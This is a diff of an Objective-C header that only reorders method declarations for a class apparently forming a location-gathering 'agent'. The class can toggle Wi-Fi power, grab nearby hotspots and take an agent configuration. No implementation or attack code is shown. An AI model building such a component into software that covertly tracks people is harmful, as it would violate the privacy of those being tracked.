@@ -42,18 +42,26 @@ typedef struct _LocationAdditionalData {
 
 + (__m_MAgentPosition *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
-- (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
+
 - (unsigned)retainCount;
-- (void)release;
+- (id)retain;
+
+- (id)copyWithZone: (NSZone *)aZone;
+
 - (id)autorelease;
+- (void)release;
 
 - (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface;
-- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power;
+
 - (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface;
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power;
+
 - (NSMutableDictionary *)mAgentConfiguration;
+- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+
 - (BOOL)grabHotspots;
-- (BOOL)stop;
+
 - (void)start;
+- (BOOL)stop;
+
 @end
